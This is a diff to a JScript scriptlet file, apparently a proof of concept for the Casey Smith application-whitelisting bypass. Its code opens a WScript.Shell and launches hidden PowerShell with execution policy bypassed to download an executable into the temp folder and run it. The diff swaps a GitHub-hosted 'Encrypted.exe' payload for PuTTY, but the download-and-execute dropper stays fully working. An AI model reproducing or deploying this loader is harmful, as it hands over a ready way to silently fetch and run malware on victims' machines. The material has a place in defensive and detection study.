@@ -12,11 +12,10 @@
 	<!-- Credits Of Concept - Casey Smith  -->
 	<script language="JScript">
 		<![CDATA[
-		
             var Wish = new ActiveXObject("WScript.Shell");
-			var d1ce = "$down = New-Object System.Net.WebClient;$url = 'https://github.com/c0met/123.sct/raw/master/Encrypted.exe';$file = '%TMP%\\1-DEL-ME.exe';$down.DownloadFile($url,$file);$exec = New-Object -com shell.application;$exec.shellexecute($file);exit;";
-			var p0wrsh3ll = 'powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -Command ';
-			Wish.Exec(p0wrsh3ll + d1ce);
+ 			var dice = "$down = New-Object System.Net.WebClient;$url = 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe';$file = '%TMP%\\Putty.exe';$down.DownloadFile($url,$file);$exec = New-Object -com shell.application;$exec.shellexecute($file);exit;";
+ 			var p0wrshell = 'powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -Command ';
+ 			Wish.Exec(p0wrshell + dice);
     
 		]]>
 </script>
